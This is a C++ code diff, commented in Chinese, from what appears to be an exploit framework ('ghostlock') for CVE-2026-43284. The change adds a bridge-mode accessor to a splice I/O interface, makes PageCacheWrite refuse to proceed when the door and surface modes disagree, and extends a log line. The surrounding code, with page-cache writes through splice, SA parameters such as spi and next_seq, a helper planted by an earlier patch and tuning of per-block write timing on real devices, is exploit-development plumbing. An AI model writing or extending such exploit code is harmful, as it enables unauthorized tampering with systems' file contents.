@@ -49,6 +49,12 @@ namespace ghostlock::backend::cve_2026_43284::landing {
          *  真实现（RealSpliceIo）会把它自己的失败点写进去 —— 设备上定位就靠这一个数。 */
         [[nodiscard]] virtual int last_error() const noexcept { return 0; }
 
+        /** 这个面声明的桥形态（0 = 每块 fork 一次，1 = 一次 fork 的常驻会话）。默认 0：测试替身与
+         *  旧装配不必知道它；真实现（RealSpliceIo）把 SpliceIoOps::bridge_mode 原样报出来。
+         *  门与面必须同值 —— PageCacheWrite::open_doors 在路由起来时对账。 */
+        [[nodiscard]] virtual int bridge_mode() const noexcept { return kBridgeModeSpawn; }
+
+
         /** Read bytes at an offset from the file, or a negative value. */
         [[nodiscard]] virtual long read_at(int fd, std::uint8_t *out, std::size_t size,
                                            std::uint64_t offset) noexcept = 0;
@@ -96,14 +102,23 @@ namespace ghostlock::backend::cve_2026_43284::landing {
 
     class PageCacheWrite final : public PageCacheWindow {
     public:
-        PageCacheWrite(DoorOps &doors, SpliceOps &splice, int handed_in_fd = -1) noexcept
-            : doors_(doors, handed_in_fd), splice_(splice) {}
+        PageCacheWrite(DoorOps &doors, SpliceOps &splice, int handed_in_fd = -1,
+                       int bridge_mode = kBridgeModeDefault) noexcept
+            : doors_(doors, handed_in_fd, bridge_mode), splice_(splice) {}
 
         /** 最近一次写的 splice 失败码（转自表面；见 SpliceOps::last_error）。 */
         [[nodiscard]] int last_error() const noexcept { return splice_.last_error(); }
 
         /** Open the doors with the whole frame, and keep what the write needs from it. */
         [[nodiscard]] bool open_doors(const SaMaterial &sa) noexcept override {
+            /* 两处开关必须同值：门说 session、面说 spawn（或反过来）这种半切换的装配，会让每块仍然
+             *  fork 一次而没有人察觉（真机上就是 74 ms/块）。所以它在路由起来时就被拒，而不是等到
+             *  1470 块写完之后从耗时里读出来。 */
+            if (doors_.bridge_mode() != splice_.bridge_mode()) {
+                GL_LOGI("window: refused bridge-mode mismatch doors=%d surface=%d",
+                        doors_.bridge_mode(), splice_.bridge_mode());
+                return false;
+            }
             if (!doors_.open(sa)) {
                 return false;
             }
@@ -117,8 +132,9 @@ namespace ghostlock::backend::cve_2026_43284::landing {
             /* 门开之后的事实（成功历史：git show 6f7ded87:src/core/backend/cve_2026_43284/pagecache/pagecache.cpp:189-195
              *  —— 那边 write16 用的就是 sa.spi / ctx.next_seq 与十六字节向量；next_seq 从 1 起）。
              *  fd：file_fd 是载体的门（远端为 -1，此时页由 patch #1 写下的 helper 送进管道）。 */
-            GL_LOGI("window: doors open spi=0x%08x icv_len=%u next_seq=%u file_fd=%d socket_fd=%d",
-                    spi_, static_cast<unsigned>(icv_len_), next_seq_, doors_.file_fd(), doors_.socket_fd());
+            GL_LOGI("window: doors open spi=0x%08x icv_len=%u next_seq=%u file_fd=%d socket_fd=%d bridge_mode=%d",
+                    spi_, static_cast<unsigned>(icv_len_), next_seq_, doors_.file_fd(), doors_.socket_fd(),
+                    doors_.bridge_mode());
             return true;
         }
 
